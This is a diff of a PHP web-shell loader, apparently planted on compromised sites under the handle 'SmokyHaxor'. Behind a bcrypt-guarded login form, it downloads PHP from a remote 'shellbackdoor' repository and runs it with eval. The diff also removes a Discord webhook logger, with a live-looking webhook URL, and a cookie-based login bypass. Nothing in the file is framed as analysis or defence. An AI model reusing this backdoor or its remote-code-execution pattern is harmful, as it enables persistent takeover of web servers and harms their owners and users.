@@ -1,70 +1,31 @@
 <?php
 session_start();
 
-/**
- */
-function sendToDiscord($message, $webhook_url) {
-    $data = [
-        "content" => $message
-    ];
-
-    $options = [
-        'http' => [
-            'header' => "Content-Type: application/json\r\n",
-            'method' => 'POST',
-            'content' => json_encode($data),
-        ],
-    ];
-
-    $context = stream_context_create($options);
-    return file_get_contents($webhook_url, false, $context);
-}
-
-$discord_webhook_url = "https://discord.com/api/webhooks/1314533406100688927/l2hFciICVSduUvl1FZIaM6rRIWM1jMJYXiwq5pfIDv_KC4rwBrQNpiu4l4skTAEldmdz";
-
-$user_ip = $_SERVER['REMOTE_ADDR'];
-$full_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-
-if (!isset($_SESSION['loggedin']) && isset($_COOKIE['custom_cookie']) && $_COOKIE['custom_cookie'] === 'vava') {
-    $_SESSION['loggedin'] = true;
-
-    sendToDiscord("[SmokyHaxor] Login melalui cookie berhasil. IP: $user_ip, URL: $full_url", $discord_webhook_url);
-
-    header("Location: " . $_SERVER['PHP_SELF']); 
-    exit();
-}
-
 // Tentukan username dan password hash
 $username = "admin";
-$passwordHash = '$2y$10$n4v3QiNYZMbFLFklIb5IAOHMN8Mqppsfchq2hCpiK3Ga9wOsqh1GO'; // Hash bcrypt
+$passwordHash = '$2a$12$xcVCwKSwZrs179k/s98eJ.K.nCz3uGj.SX7xOBlpGa//z7fLWJx52'; // Hash bcrypt
 
 // Cek apakah pengguna sudah login sebelumnya
 if (!isset($_SESSION['loggedin'])) {
+    // Cek apakah form sudah di-submit
     if (isset($_POST['username']) && isset($_POST['password'])) {
+        // Validasi username dan password
         if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
+            // Jika username dan password benar, set sesi login
             $_SESSION['loggedin'] = true;
-
-            // Set cookie dengan nilai "vava"
-            setcookie('custom_cookie', 'vava', time() + 3600, '/');
-
-            sendToDiscord("[SmokyHaxor] Login berhasil. IP: $user_ip, URL: $full_url, Username: {$_POST['username']}", $discord_webhook_url);
-
-            header("Location: " . $_SERVER['PHP_SELF']);
+            header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman setelah login
             exit();
         } else {
+            // Jika username atau password salah, tampilkan pesan error
             $error = "Username atau password salah. Silakan coba lagi.";
-
-            // Kirim log login gagal ke Discord
-            sendToDiscord("[SmokyHaxor] Login gagal. IP: $user_ip, URL: $full_url, Username: {$_POST['username']}", $discord_webhook_url);
         }
     }
 }
 
+// Jika sudah login, lakukan get contents dari URL
 if (isset($_SESSION['loggedin'])) {
-    $url = 'https://nekan-dua.dev/aexdy/haxor/boobat.jpg'; 
+    $url = 'https://raw.githubusercontent.com/aexdyhaxor/shellbackdoor/refs/heads/main/alpa.php'; // Ganti URL dengan lokasi script PHP yang ingin diambil
     $content = file_get_contents($url);
-
-    sendToDiscord("[SmokyHaxor] Akses URL: $url, IP: $user_ip, URL Asal: $full_url", $discord_webhook_url);
 
     if ($content !== false) {
         eval('?>' . $content); // Menjalankan konten sebagai kode PHP
@@ -74,6 +35,7 @@ if (isset($_SESSION['loggedin'])) {
     exit();
 }
 
+// Jika belum login, tampilkan form login dan hentikan eksekusi script lainnya
 if (!isset($_SESSION['loggedin'])) {
     ?>
     <!DOCTYPE html>
@@ -90,7 +52,7 @@ if (!isset($_SESSION['loggedin'])) {
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                background-color:rgb(34, 0, 0);
+                background-color: #220022;
                 font-family: Arial, sans-serif;
             }
 
@@ -104,7 +66,7 @@ if (!isset($_SESSION['loggedin'])) {
             .login-form {
                 width: 300px;
                 padding: 20px;
-                background-color:rgb(61, 52, 0);
+                background-color: #3d003d;
                 border-radius: 8px;
                 box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
                 text-align: center;
@@ -173,7 +135,7 @@ if (!isset($_SESSION['loggedin'])) {
     <body>
         <div class="form-container">
             <div class="login-form">
-                <img src="https://faktawanita.com/meong/jooboobat.png" alt="Logo">
+                <img src="https://i.pinimg.com/564x/6e/a8/02/6ea802b32f53cda0bf7542059d174481.jpg" alt="Logo">
                 <h2>Login Form</h2>
                 <?php if (isset($error)): ?>
                     <div class="error-message"><?php echo $error; ?></div>
